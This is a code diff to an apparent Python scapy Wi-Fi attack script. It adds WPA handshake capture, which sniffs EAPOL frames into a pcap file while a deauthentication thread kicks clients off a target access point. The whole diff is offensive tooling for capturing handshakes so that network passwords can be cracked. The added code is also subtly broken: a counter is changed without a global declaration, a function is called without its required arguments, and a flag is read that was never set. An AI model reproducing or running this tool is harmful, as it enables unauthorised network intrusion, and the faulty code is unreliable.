@@ -5,6 +5,8 @@ from scapy.all import *
 
 networks = []
 
+eapol_count = 0
+
 def write_networks():
     try:
         with open("wifi_networks.json", "w") as f:
@@ -39,6 +41,23 @@ def deauth_attack(ap_mac, channel):
     except Exception as e:
         print(f"Error performing deauthentication attack: {e}")
 
+
+def WPAhandshake(packet):
+    pktdump = PcapWriter("tmp/handshake.pcap", append=True, sync=True)
+    pktdump.write(packet)
+
+    if (EAPOL in packet):
+        eapol_count+=1
+    if eapol_count >= 10:
+        captured = True
+        return captured
+
+
+def capture_handshake(ap_mac, channel):
+    sniff(stop_filter=WPAhandshake, iface="wlan1", monitor=True, timeout=20)
+
+
+
 def read_saved_networks():
     try:
         with open("wifi_networks.json", "r") as f:
@@ -61,3 +80,8 @@ if __name__ == "__main__":
         deauther = threading.Thread(target=deauth_attack, args=(ap_mac, channel))
         deauther.daemon = True
         deauther.start()
+        capture_handshake()
+        deauther.join()
+
+        if captured:
+            print("4-way handshake captured")
